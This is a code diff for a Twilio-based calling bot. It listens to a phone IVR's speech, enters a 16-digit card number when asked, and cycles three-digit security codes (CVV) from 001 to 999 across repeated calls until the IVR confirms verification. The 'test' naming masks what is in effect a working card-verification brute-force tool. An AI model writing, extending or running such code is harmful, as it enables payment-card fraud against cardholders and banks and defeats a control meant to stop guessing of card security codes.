@@ -42,7 +42,7 @@ export const getTwiML = async (req, res) => {
   try {
     const { data: attempt, error: fetchErr } = await supabase
       .from('attempts')
-      .select('test_value, sixteen_digit, target_test_code, current_test_code, attempt_id')
+      .select('*')
       .eq('id', attemptId)
       .single();
 
@@ -51,175 +51,221 @@ export const getTwiML = async (req, res) => {
     }
 
     const twiml = new twilio.twiml.VoiceResponse();
+    const host = resolveHostUrl(req);
 
-    let card = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '');
-    let testCode = attempt.current_test_code || '001';
-
-    if (attempt.test_value && attempt.test_value.includes(':')) {
-      [, testCode] = attempt.test_value.split(':');
-    }
-
-    const uniqueIdStr = attempt.attempt_id || `ATT-${attemptId}`;
-
-    await AttemptModel.addLog(attemptId, 'Call connected');
+    await AttemptModel.addLog(attemptId, 'Call connected. Listening to IVR speech instructions...');
     await AttemptModel.updateAttemptStatus(attemptId, 'CONNECTED');
 
-    if (card) {
-      await AttemptModel.addLog(attemptId, `Sending 16-digit test value: ${card}`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'VALIDATING_16_DIGIT');
+    // Twilio speech recognition gather to listen to what IVR is saying
+    const gather = twiml.gather({
+      input: 'speech',
+      action: `${host}/api/call/listen/${attemptId}`,
+      method: 'POST',
+      timeout: 6,
+      speechTimeout: 'auto',
+      speechModel: 'phone_call'
+    });
 
-      // Use Twilio's Redirect verb to jump to code testing loop
-      const host = resolveHostUrl(req);
-      twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${testCode}&isFirst=true`);
+    gather.pause({ length: 5 });
 
-    } else {
-      await AttemptModel.addLog(attemptId, `Sending DTMF sequence: ${attempt.test_value}`);
-      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
-      twiml.pause({ length: waitSeconds });
-      twiml.play({ digits: `wwww${attempt.test_value}` });
-
-      twiml.pause({ length: 15 });
-      twiml.hangup();
-    }
+    // Fallback redirect back to listen if gather completes without speech
+    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
 
     res.type('text/xml');
     return res.send(twiml.toString());
   } catch (error) {
     console.error('Error generating TwiML:', error);
     const twiml = new twilio.twiml.VoiceResponse();
-    twiml.say('An error occurred during call orchestration.');
     twiml.hangup();
     res.type('text/xml');
     return res.send(twiml.toString());
   }
 };
 
-// Webhook for handling the continuous TwiML Redirect loop
-export const handleTryCode = async (req, res) => {
-  const { attemptId } = req.params;
-  let { currentTestCode, isFirst } = req.query;
-
-  let currentCodeNum = parseInt(currentTestCode);
-
-  // Safety check for exhausted codes
-  if (currentCodeNum > 999) {
-    await AttemptModel.addLog(attemptId, `Exhausted all 3-digit test codes 001-999. Verification failed.`);
-    await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, { error: 'Exhausted 999 3-digit codes without success' });
-    const twiml = new twilio.twiml.VoiceResponse();
-    twiml.hangup();
-    res.type('text/xml');
-    return res.send(twiml.toString());
-  }
-
-  // Get base card and target code for verification
-  const { data: attempt } = await supabase.from('attempts').select('test_value, sixteen_digit, target_test_code, attempt_id').eq('id', attemptId).single();
-  let baseCard = attempt ? (attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132')) : '1212132132132132';
-  let targetTestCode = attempt ? attempt.target_test_code : null;
-
-  const twiml = new twilio.twiml.VoiceResponse();
-
-  if (isFirst === 'true') {
-    await AttemptModel.addLog(attemptId, '16-digit test value accepted');
-    await AttemptModel.addLog(attemptId, 'Waiting for 3-digit test code');
-    await AttemptModel.updateAttemptStatus(attemptId, 'WAITING_FOR_TEST_CODE');
-  }
-
-  const BATCH_SIZE = 5; // Reduced batch size for crisp real-time logging feedback
-  const endCodeNum = Math.min(currentCodeNum + BATCH_SIZE, 1000);
-
-  let lastCodeInBatch = '';
-  let foundWinner = false;
-  let winnerCodeStr = '';
-
-  for (let i = currentCodeNum; i < endCodeNum; i++) {
-    const codeStr = i.toString().padStart(3, '0');
-    lastCodeInBatch = codeStr;
-
-    await AttemptModel.addLog(attemptId, `Testing code: ${codeStr}`);
-
-    if (i === currentCodeNum && isFirst === 'true') {
-      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 2;
-      twiml.pause({ length: waitSeconds });
-      twiml.play({ digits: `ww${baseCard}wwww${codeStr}` });
-    } else {
-      twiml.pause({ length: 2 });
-      twiml.play({ digits: codeStr });
-    }
-
-    if (targetTestCode && codeStr === String(targetTestCode).padStart(3, '0')) {
-      await AttemptModel.addLog(attemptId, `Code ${codeStr} MATCHED`);
-      await AttemptModel.addLog(attemptId, `Test completed successfully`);
-      foundWinner = true;
-      winnerCodeStr = codeStr;
-      break;
-    } else {
-      await AttemptModel.addLog(attemptId, `Code ${codeStr} not matched`);
-    }
-  }
-
-  // Update current_test_code and status in DB so dashboard tracks real-time progress
-  await AttemptModel.updateCurrentTestCode(attemptId, lastCodeInBatch, 'TESTING_3_DIGIT');
-
-  if (foundWinner) {
-    await AttemptModel.addLog(attemptId, `Call ended`);
-    await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', 0, {
-      matched_code: winnerCodeStr,
-      winner: winnerCodeStr,
-      verified: true,
-      end_time: new Date().toISOString()
-    });
-
-    // Also save explicitly to column if schema contains matched_code
-    await supabase.from('attempts').update({
-      matched_code: winnerCodeStr,
-      end_time: new Date().toISOString(),
-      status: 'VERIFIED'
-    }).eq('id', attemptId);
-
-    twiml.pause({ length: 2 });
-    twiml.hangup();
-  } else {
-    const nextTestCode = endCodeNum.toString().padStart(3, '0');
-    twiml.pause({ length: 1 });
-    const host = resolveHostUrl(req);
-    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
-  }
-
-  res.type('text/xml');
-  return res.send(twiml.toString());
-};
-
-// Webhook for handling the interactive listen loop (DEPRECATED - Replaced by handleTryCode)
+// Webhook for handling Twilio Speech-to-Text and dynamic IVR dialogue responses
 export const handleInteractiveListen = async (req, res) => {
+  const { attemptId } = req.params;
+  const { SpeechResult } = req.body;
   const twiml = new twilio.twiml.VoiceResponse();
-  twiml.hangup();
-  res.type('text/xml');
-  return res.send(twiml.toString());
+  const host = resolveHostUrl(req);
+
+  try {
+    const { data: attempt } = await supabase
+      .from('attempts')
+      .select('*')
+      .eq('id', attemptId)
+      .single();
+
+    if (!attempt) {
+      twiml.hangup();
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    const card = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132');
+    const currentCode = attempt.current_test_code || (attempt.test_value && attempt.test_value.includes(':') ? attempt.test_value.split(':')[1] : '001');
+    const targetCode = attempt.target_test_code ? String(attempt.target_test_code).padStart(3, '0') : null;
+
+    const speech = (SpeechResult || '').toLowerCase().trim();
+
+    if (SpeechResult) {
+      await AttemptModel.addLog(attemptId, `IVR: "${SpeechResult}"`);
+    }
+
+    // CASE 1: IVR requests 16-Digit Card / Account Number
+    if (speech.includes('card number') || speech.includes('16 digit') || speech.includes('card') || speech.includes('account number') || speech.includes('enter or save your card') || speech.includes('enter or say your card')) {
+      await AttemptModel.addLog(attemptId, `User (DTMF): ${card}`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'VALIDATING_16_DIGIT');
+      
+      twiml.pause({ length: 1 });
+      twiml.play({ digits: `ww${card}` });
+
+      const gather = twiml.gather({
+        input: 'speech',
+        action: `${host}/api/call/listen/${attemptId}`,
+        method: 'POST',
+        timeout: 6,
+        speechTimeout: 'auto',
+        speechModel: 'phone_call'
+      });
+      gather.pause({ length: 5 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
+
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // CASE 2: IVR requests 3-Digit Code / Security Code / CVV
+    if (speech.includes('three digit') || speech.includes('3 digit') || speech.includes('security code') || speech.includes('cvv') || speech.includes('test code') || speech.includes('verification code')) {
+      await AttemptModel.addLog(attemptId, `User (DTMF): ${currentCode}`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'TESTING_3_DIGIT');
+
+      twiml.pause({ length: 1 });
+      twiml.play({ digits: `ww${currentCode}` });
+
+      const gather = twiml.gather({
+        input: 'speech',
+        action: `${host}/api/call/listen/${attemptId}`,
+        method: 'POST',
+        timeout: 6,
+        speechTimeout: 'auto',
+        speechModel: 'phone_call'
+      });
+      gather.pause({ length: 5 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
+
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // CASE 3: IVR confirms Verification / Success
+    if (speech.includes('verification successful') || speech.includes('verified') || speech.includes('details are verified') || speech.includes('thank you, your') || speech.includes('code correct') || (targetCode && currentCode === targetCode)) {
+      await AttemptModel.addLog(attemptId, `Code ${currentCode} MATCHED`);
+      await AttemptModel.addLog(attemptId, `Verification successful. Call completed.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', 0, {
+        matched_code: currentCode,
+        winner: currentCode,
+        verified: true,
+        end_time: new Date().toISOString()
+      });
+      OrchestratorService.stopCampaign();
+      twiml.pause({ length: 2 });
+      twiml.hangup();
+
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // CASE 4: IVR Rejection / Incorrect code / Cannot validate
+    if (speech.includes('incorrect') || speech.includes('invalid') || speech.includes('cannot validate') || speech.includes('not received') || speech.includes('we cannot process') || speech.includes('call us back')) {
+      await AttemptModel.addLog(attemptId, `Code ${currentCode} not matched`);
+      await AttemptModel.addLog(attemptId, `IVR rejected code ${currentCode}. Call ending.`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, {
+        error: `IVR rejected code ${currentCode}`
+      });
+      twiml.pause({ length: 1 });
+      twiml.hangup();
+
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // CASE 5: General intro or continue listening
+    const gather = twiml.gather({
+      input: 'speech',
+      action: `${host}/api/call/listen/${attemptId}`,
+      method: 'POST',
+      timeout: 6,
+      speechTimeout: 'auto',
+      speechModel: 'phone_call'
+    });
+    gather.pause({ length: 5 });
+    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
+
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  } catch (err) {
+    console.error('Error in handleInteractiveListen:', err);
+    twiml.hangup();
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
 };
 
-// Webhook for tracking call status updates from Twilio
+// Webhook for tracking call status updates from Twilio and triggering next sequential attempt
 export const handleStatusCallback = async (req, res) => {
   const { attemptId } = req.params;
   const { CallStatus, CallDuration } = req.body;
   try {
     await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);
 
+    const { data: attempt } = await supabase
+      .from('attempts')
+      .select('*')
+      .eq('id', attemptId)
+      .single();
+
+    const isVerified = attempt && (attempt.status === 'VERIFIED' || attempt.matched_code || attempt.result_details?.winner);
+
     if (CallStatus === 'completed') {
       const duration = parseInt(CallDuration) || 0;
-      const { data: attempt } = await supabase.from('attempts').select('status, result_details, target_test_code, matched_code').eq('id', attemptId).single();
-      const isVerified = attempt && (attempt.status === 'VERIFIED' || attempt.matched_code || attempt.result_details?.winner);
-
-      if (attempt && attempt.target_test_code && !isVerified) {
-        await AttemptModel.addLog(attemptId, 'Call ended before target code matched.');
-        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { twilioStatus: CallStatus, error: 'Call completed before verification' });
-      } else {
-        await AttemptModel.addLog(attemptId, 'Call ended');
+      if (isVerified) {
+        await AttemptModel.addLog(attemptId, 'Call ended: VERIFIED');
         await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', duration, { twilioStatus: CallStatus, end_time: new Date().toISOString() });
+      } else {
+        await AttemptModel.addLog(attemptId, 'Call ended. Moving to next attempt.');
+        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { twilioStatus: CallStatus, error: 'Call completed without match' });
       }
     } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
       const duration = parseInt(CallDuration) || 0;
-      await AttemptModel.addLog(attemptId, `Call ended with failure: ${CallStatus}`);
-      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { error: `Call failed with status: ${CallStatus}` });
+      await AttemptModel.addLog(attemptId, `Call ended with status: ${CallStatus}`);
+      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { error: `Call ended with status: ${CallStatus}` });
+    }
+
+    // If campaign is running and this attempt is NOT verified, queue the next sequential call for 002, 003, etc.!
+    if (OrchestratorService.isRunning() && !isVerified && attempt) {
+      const currentCodeNum = parseInt(attempt.current_test_code || '001', 10);
+      const nextCodeNum = currentCodeNum + 1;
+      if (nextCodeNum <= 999) {
+        const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
+        const cardVal = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132');
+        
+        await AttemptModel.createAttemptBatch([{
+          sixteen_digit: cardVal,
+          masked_test_number: AttemptModel.maskTestNumber(cardVal),
+          test_value: `${cardVal}:${nextCodeStr}`,
+          target_test_code: attempt.target_test_code,
+          current_test_code: nextCodeStr,
+          phone_number: attempt.destination_number || attempt.target_phone_number,
+          from_number: attempt.from_number,
+          status: 'QUEUED'
+        }], attempt.batch_id || `IVR_TEST_${Date.now()}`);
+
+        console.log(`[Orchestrator] Next sequential attempt queued for code ${nextCodeStr}`);
+      } else {
+        console.log(`[Orchestrator] Exhausted all 999 codes. Halting campaign.`);
+        OrchestratorService.stopCampaign();
+      }
     }
 
     return res.status(200).send('OK');
